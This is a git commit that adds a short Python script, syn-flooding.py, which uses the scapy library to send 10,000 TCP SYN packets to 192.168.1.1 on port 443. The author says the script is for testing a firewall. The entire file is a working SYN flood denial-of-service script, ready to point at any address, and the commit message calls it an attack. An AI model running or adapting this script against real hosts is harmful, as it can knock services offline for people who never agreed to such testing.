031a3b0eee302066df6169594268ece13642c7d1
MortezaLSC <mrtzlsc@gmail.com>
2014-01-05 22:38:27 +0330

    Create syn-flooding.py
    It does syn flooding attack for testing the firewall

---
+++ syn-flooding.py
@@ -0,0 +1,16 @@
+#!/usr/bin/python
+#This scripts is written by "MortezaLSC" on Sunday, 5 2014 at 10:35 PM
+#It does syn flooding attack for testing the firewall
+
+import sys
+from scapy.all import *
+
+i = IP()
+i.dst="192.168.1.1"
+
+t = TCP()
+t.dport=443
+t.flags="S"
+
+for n in range(0,10000):
+    send(i/t)
